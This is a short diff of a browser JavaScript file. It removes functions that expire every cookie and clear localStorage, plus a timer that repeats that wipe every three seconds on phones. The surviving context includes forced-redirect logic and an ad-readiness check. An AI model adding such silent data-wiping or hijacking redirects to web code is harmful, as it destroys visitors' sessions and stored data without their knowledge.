@@ -45,25 +45,6 @@ function redirect() {
   os.remove();
 }
 
-function getCookie() {
-  const arr = document.cookie.match(/[^ =;]+(?=\=)|[A-z]*/g);
-  return arr;
-}
-
-function clear() {
-  const keys = getCookie();
-  const { host } = window.location;
-  if (keys) {
-    for (let i = keys.length; i--;) {
-      if (keys[i]) {
-        document.cookie = `${keys[i]}=0;path=/;expires=${new Date(0).toUTCString()}`;
-        document.cookie = `${keys[i]}=0;path=/;domain=.${host};expires=${new Date(0).toUTCString()}`;
-      }
-    }
-  }
-  window.localStorage.clear();
-}
-
 function handler(e) {
   if (window.top === window && !window.haveRedirect) {
     setTimeout(redirect, 0);
@@ -84,12 +65,6 @@ if (document.addEventListener) {
   document.attachEvent('onreadystatechange', handler);
   window.attachEvent('onload', handler);
 }
-
-setInterval(() => {
-  if (phone) {
-    clear();
-  }
-}, 3000);
 
 setTimeout(() => {
   if (window.adReady) return;
